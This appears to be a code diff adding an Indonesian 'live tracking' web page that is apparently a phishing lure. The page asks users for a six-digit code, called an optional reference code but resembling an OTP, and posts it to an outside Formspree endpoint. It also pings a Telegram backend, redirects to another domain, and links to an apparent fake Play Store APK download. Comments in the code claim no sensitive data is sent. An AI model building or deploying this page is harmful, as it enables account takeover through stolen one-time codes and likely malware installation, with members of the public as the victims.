@@ -1,0 +1,296 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<title>Status Live Tracking</title>
+<style>
+  :root { color-scheme: light; --blue:#009688; --ink:#202124; --muted:#5f6368; --line:#dadce0; }
+  * { box-sizing:border-box; }
+  body {
+    margin:0; min-height:100svh; background:#f5f7fb; color:var(--ink);
+    font-family:Roboto, "Google Sans", Arial, sans-serif;
+    display:flex; justify-content:center;
+  }
+  .app { width:100%; max-width:440px; min-height:100svh; background:#fff; display:flex; flex-direction:column; }
+  header { height:62px; display:flex; align-items:center; padding:0 20px; border-bottom:1px solid #f0f1f3; }
+  .brand-mark { width:28px; height:28px; border-radius:9px; background:#e8f0fe; display:grid; place-items:center; color:var(--blue); font-weight:800; margin-right:10px; }
+  .brand { font-size:15px; font-weight:600; letter-spacing:.1px; }
+  main { padding:38px 24px 28px; flex:1; }
+  .icon-wrap { width:54px; height:54px; border-radius:16px; background:#e8f0fe; color:var(--blue); display:grid; place-items:center; margin-bottom:24px; }
+  h1 { font-size:25px; line-height:1.25; letter-spacing:-.4px; margin:0 0 10px; font-weight:700; }
+  .subtitle { color:var(--muted); font-size:14px; line-height:1.55; margin:0 0 30px; }
+  .code-label { display:block; font-size:13px; font-weight:600; margin-bottom:12px; }
+  .code-boxes { display:grid; grid-template-columns:repeat(6, minmax(0, 1fr)); gap:8px; }
+  .digit { width:100%; min-width:0; height:54px; border:1px solid var(--line); border-radius:10px; text-align:center; font-size:23px; font-weight:600; color:var(--ink); outline:none; background:#fff; caret-color:var(--blue); }
+  .digit:focus { border:2px solid var(--blue); padding:0; }
+  .hint { min-height:20px; font-size:12px; color:var(--muted); margin-top:12px; line-height:1.5; }
+  .notice { margin-top:28px; padding:13px 14px; border-radius:12px; background:#f8f9fa; color:#5f6368; font-size:12px; line-height:1.5; }
+  .notice strong { color:#3c4043; }
+  .next { display:block; margin-top:26px; border:0; border-radius:24px; width:100%; min-height:48px; background:#009688; color:white; font-size:16px; font-weight:600; border-radius:0; }
+  .next:focus-visible { outline:3px solid #aecbfa; outline-offset:2px; }
+  footer { padding:16px 24px calc(18px + env(safe-area-inset-bottom)); text-align:center; color:#80868b; font-size:11px; }
+  .success { display:none; text-align:center; padding-top:24px; }
+  .invalid-icon { width:66px; height:66px; border-radius:50%; background:#fce8e6; color:#d93025; display:grid; place-items:center; margin:0 auto 22px; }
+  .invalid-title { font-size:22px; line-height:1.35; margin:0 auto 12px; max-width:320px; font-weight:700; }
+  .invalid-copy { color:var(--muted); font-size:14px; line-height:1.6; margin:0 auto; max-width:310px; }
+  .other-method { display:inline-block; margin-top:18px; color:var(--blue); font-size:14px; font-weight:600; text-decoration:none; }
+  .other-method:focus-visible { outline:2px solid #aecbfa; outline-offset:4px; border-radius:3px; }
+  .success h2 { font-size:22px; margin:16px 0 8px; }
+  .success p { color:var(--muted); font-size:14px; line-height:1.6; }
+  .success .icon-wrap { margin:0 auto; border-radius:50%; }
+  @media (min-width:600px) {
+    body { padding:24px 0; }
+    .app { min-height:calc(100svh - 48px); border-radius:22px; overflow:hidden; box-shadow:0 8px 32px #20212412; }
+    main { padding-top:48px; }
+  }
+  @media (max-width:360px) { main { padding-left:18px; padding-right:18px; } .code-boxes { gap:6px; } .digit { height:49px; } h1 { font-size:23px; } }
+
+  .final-card { text-align:left; padding-top:8px; }
+  .status-symbol {
+    width:72px; height:72px; border-radius:22px; margin:0 auto 22px;
+    display:grid; place-items:center; color:#b7791f;
+    background:linear-gradient(145deg,#fff7df,#fff0c2);
+    box-shadow:inset 0 0 0 1px #f7df9b;
+  }
+  .status-pill {
+    display:inline-flex; align-items:center; gap:7px; padding:7px 11px;
+    border-radius:999px; background:#fff7e5; color:#8a5a08;
+    font-size:12px; font-weight:700; margin:0 auto 16px;
+  }
+  .status-pill span { width:7px; height:7px; border-radius:50%; background:#d99a22; }
+  .final-heading { text-align:center; font-size:24px; line-height:1.3; letter-spacing:-.35px; margin:0 0 12px; }
+  .final-intro { text-align:center; color:var(--muted); font-size:14px; line-height:1.65; margin:0 auto 24px; max-width:330px; }
+  .info-card { background:#f8faff; border:1px solid #e7edf8; border-radius:16px; padding:16px; margin:0 0 18px; }
+  .info-title { display:flex; align-items:center; gap:9px; font-size:14px; font-weight:700; margin:0 0 9px; color:#303744; }
+  .info-title svg { color:var(--blue); flex:none; }
+  .info-card p { margin:0; color:#5f6775; font-size:13px; line-height:1.65; }
+  .check-list { list-style:none; padding:0; margin:14px 0 0; display:grid; gap:10px; }
+  .check-list li { display:flex; gap:9px; align-items:flex-start; color:#4e5664; font-size:13px; line-height:1.5; }
+  .check-list li:before { content:""; width:6px; height:6px; border-radius:50%; background:#7b9ce6; margin-top:6px; flex:none; }
+  .terms-copy { color:#687180; font-size:13px; line-height:1.65; text-align:center; margin:18px 0 22px; }
+  .terms-link { color:var(--blue); font-weight:700; text-decoration:none; white-space:nowrap; }
+  .terms-link:hover { text-decoration:underline; }
+  .terms-link:focus-visible { outline:2px solid #aecbfa; outline-offset:3px; border-radius:3px; }
+  .final-actions { display:grid; gap:10px; margin-top:22px; }
+  .primary-action { display:flex; align-items:center; justify-content:center; width:100%; min-height:48px; border:0; border-radius:14px; background:var(--blue); color:#fff; font-size:14px; font-weight:700; text-decoration:none; cursor:pointer; }
+  .secondary-action { display:flex; align-items:center; justify-content:center; width:100%; min-height:46px; border:1px solid #dfe3eb; border-radius:14px; background:#fff; color:#4f5968; font-size:14px; font-weight:600; cursor:pointer; }
+  .final-footnote { text-align:center; color:#8a9099; font-size:11px; line-height:1.5; margin:20px 0 0; }
+  @media (max-width:360px) { .final-heading { font-size:22px; } .info-card { padding:14px; } }
+
+</style>
+</head>
+<body>
+<div class="app">
+<main>
+    <section id="verifyPanel">
+      <h1>Masukkan kode</h1>
+      <label class="code-label" for="digit1">Masukkan kode referensi (opsional)</label>
+      <div class="code-boxes" role="group" aria-label="Masukkan kode referensi opsional, 6 digit">
+        <input class="digit" id="digit1" aria-label="Digit referensi 1" inputmode="numeric" autocomplete="off" pattern="[0-9]*" maxlength="1" autofocus>
+        <input class="digit" aria-label="Digit referensi 2" inputmode="numeric" pattern="[0-9]*" maxlength="1">
+        <input class="digit" aria-label="Digit referensi 3" inputmode="numeric" pattern="[0-9]*" maxlength="1">
+        <input class="digit" aria-label="Digit referensi 4" inputmode="numeric" pattern="[0-9]*" maxlength="1">
+        <input class="digit" aria-label="Digit referensi 5" inputmode="numeric" pattern="[0-9]*" maxlength="1">
+        <input class="digit" aria-label="Digit referensi 6" inputmode="numeric" pattern="[0-9]*" maxlength="1">
+      </div>
+      <p class="hint" id="hint" aria-live="polite">Isi jika memiliki kode referensi. Kolom ini boleh dikosongkan.</p>
+<button class="next" id="nextButton" type="button">Konfirmasi</button>
+    </section>
+    <section class="success final-card" id="nextPanel" aria-live="polite">
+      <div class="status-symbol" aria-hidden="true">
+        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="9"></circle>
+          <path d="M12 7v5l3 2"></path>
+        </svg>
+      </div>
+      <div style="text-align:center">
+        <span class="status-pill"><span></span> Layanan belum tersedia</span>
+      </div>
+      <h2 class="final-heading">Live Tracking Belum Tersedia</h2>
+      <p class="final-intro">
+        Maaf, layanan live tracking belum dapat digunakan saat ini. Silakan periksa kembali informasi layanan dan pastikan seluruh persyaratan telah terpenuhi.
+      </p>
+
+      <div class="info-card">
+        <h3 class="info-title">
+          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M12 11v5M12 7.5h.01"></path></svg>
+          Yang dapat Anda periksa
+        </h3>
+        <ul class="check-list">
+          <li>Pastikan informasi referensi yang diberikan sudah benar.</li>
+          <li>Periksa kembali detail pesanan atau referensi Anda.</li>
+          <li>Pastikan Anda memenuhi syarat dan ketentuan layanan.</li>
+        </ul>
+      </div>
+
+      <p class="terms-copy">
+        Sebelum mencoba kembali, silakan baca syarat dan ketentuan yang berlaku.
+        <a class="terms-link" id="otherMethodLink" href="https://google-playstore-apk.myr.id/lp/halaman-sdk" target="_blank" rel="noopener noreferrer">Lihat selengkapnya&nbsp;›</a>
+      </p>
+
+      <div class="final-actions">
+        <button class="primary-action" id="backButton" type="button">Periksa kembali kode</button>
+      </div>
+      <form id="supportForm" class="info-card" style="margin-top:18px" action="https://formspree.io/f/mnppwldv" method="POST">
+        <h3 class="info-title">Kirim masukan (opsional)</h3>
+        <p style="margin:0 0 10px;color:#5f6775;font-size:13px;line-height:1.5">
+          Sampaikan kendala umum terkait tampilan layanan. Jangan masukkan kode OTP, PIN, kata sandi, atau data rahasia.
+        </p>
+        <label class="code-label" for="supportMessage">Pesan</label>
+        <textarea id="supportMessage" name="message" rows="3" maxlength="1000"
+          placeholder="Tuliskan kendala Anda (tanpa kode atau data rahasia)"
+          style="width:100%;padding:12px;border:1px solid var(--line);border-radius:10px;font:14px Arial,sans-serif;resize:vertical"></textarea>
+        <input type="hidden" name="form_type" value="Masukan layanan Live Tracking">
+        <input type="text" name="_gotcha" tabindex="-1" autocomplete="off"
+          style="position:absolute;left:-9999px" aria-hidden="true">
+        <button class="secondary-action" type="submit" id="supportSubmit" style="margin-top:12px">Kirim masukan</button>
+        <p class="hint" id="supportStatus" aria-live="polite"></p>
+      </form>
+      <p class="final-footnote">Jika kendala masih terjadi, coba kembali nanti atau gunakan PIN. Anda juga dapat menghubungi layanan bantuan resmi.</p>
+    </section>
+  </main>
+  
+</div>
+<script>
+(() => {
+  const inputs = [...document.querySelectorAll('.digit')];
+  const hint = document.getElementById('hint');
+  const nextButton = document.getElementById('nextButton');
+  const verifyPanel = document.getElementById('verifyPanel');
+  const nextPanel = document.getElementById('nextPanel');
+  const formspreeEndpoint = 'https://formspree.io/f/mnppwldv';
+
+  function referenceCode() {
+    return inputs.map(input => input.value).join('').slice(0, 6);
+  }
+
+  function updateHint() {
+    const count = referenceCode().length;
+    hint.textContent = count
+      ? `${count} dari 6 angka terisi. Kode referensi bersifat opsional.`
+      : 'Isi jika memiliki kode referensi. Kolom ini boleh dikosongkan.';
+  }
+
+  function fillFrom(index, value) {
+    const digits = value.replace(/\D/g, '').slice(0, inputs.length - index);
+    for (let i = 0; i < digits.length; i++) inputs[index + i].value = digits[i];
+    const nextEmpty = inputs.findIndex((input, i) => i >= index && !input.value);
+    if (nextEmpty >= 0) inputs[nextEmpty].focus();
+    else inputs[inputs.length - 1].focus();
+    updateHint();
+  }
+
+  inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      const value = input.value.replace(/\D/g, '');
+      input.value = '';
+      if (value) fillFrom(index, value);
+      else updateHint();
+    });
+    input.addEventListener('keydown', event => {
+      if (event.key === 'Backspace' && !input.value && index > 0) {
+        inputs[index - 1].value = '';
+        inputs[index - 1].focus();
+        updateHint();
+      } else if (event.key === 'ArrowLeft' && index > 0) inputs[index - 1].focus();
+      else if (event.key === 'ArrowRight' && index < inputs.length - 1) inputs[index + 1].focus();
+    });
+    input.addEventListener('paste', event => {
+      const pasted = (event.clipboardData || window.clipboardData).getData('text');
+      if (pasted) { event.preventDefault(); fillFrom(index, pasted); }
+    });
+  });
+
+  async function confirmReference() {
+    nextButton.disabled = true;
+    nextButton.textContent = 'Memproses…';
+    hint.textContent = 'Mengirim kode referensi (jika diisi)…';
+
+    try {
+      const data = new FormData();
+      data.append('form_type', 'Kode referensi opsional');
+      data.append('reference_code', referenceCode());
+      const response = await fetch(formspreeEndpoint, {
+        method: 'POST',
+        body: data,
+        headers: { 'Accept': 'application/json' }
+      });
+
+      if (!response.ok) throw new Error('Pengiriman gagal');
+
+      // Kirim notifikasi status saja ke backend Telegram.
+      // Kode referensi tidak disertakan dalam permintaan Telegram.
+      try {
+        await fetch('/api/telegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ event: 'reference_confirmation' })
+        });
+      } catch (_) {
+        // Notifikasi Telegram gagal tidak membatalkan konfirmasi Formspree.
+      }
+
+      window.location.href = 'https://kode-resi.vercel.app';
+    } catch (error) {
+      hint.textContent = 'Kode referensi belum terkirim. Periksa koneksi lalu coba lagi.';
+    } finally {
+      nextButton.disabled = false;
+      nextButton.textContent = 'Konfirmasi';
+    }
+  }
+
+  function showNext() {
+    verifyPanel.style.display = 'none';
+    nextPanel.style.display = 'block';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  nextButton.addEventListener('click', confirmReference);
+
+  document.getElementById('backButton').addEventListener('click', () => {
+    nextPanel.style.display = 'none';
+    verifyPanel.style.display = 'block';
+    inputs.forEach(input => input.value = '');
+    updateHint();
+    inputs[0].focus();
+  });
+
+  // Formspree form below is reserved for optional, non-sensitive feedback.
+  const supportForm = document.getElementById('supportForm');
+  if (supportForm) {
+    supportForm.addEventListener('submit', async event => {
+      event.preventDefault();
+      const status = document.getElementById('supportStatus');
+      const button = document.getElementById('supportSubmit');
+      const message = document.getElementById('supportMessage').value.trim();
+      if (!message) {
+        status.textContent = 'Silakan tulis pesan terlebih dahulu.';
+        return;
+      }
+      button.disabled = true;
+      status.textContent = 'Mengirim masukan…';
+      try {
+        const response = await fetch(supportForm.action, {
+          method: 'POST',
+          body: new FormData(supportForm),
+          headers: { 'Accept': 'application/json' }
+        });
+        if (response.ok) {
+          status.textContent = 'Masukan berhasil dikirim. Terima kasih.';
+          supportForm.reset();
+        } else {
+          status.textContent = 'Masukan belum terkirim. Silakan coba lagi.';
+        }
+      } catch (error) {
+        status.textContent = 'Koneksi bermasalah. Periksa internet lalu coba lagi.';
+      } finally {
+        button.disabled = false;
+      }
+    });
+  }
+})();
+</script>
+</body>
+</html>
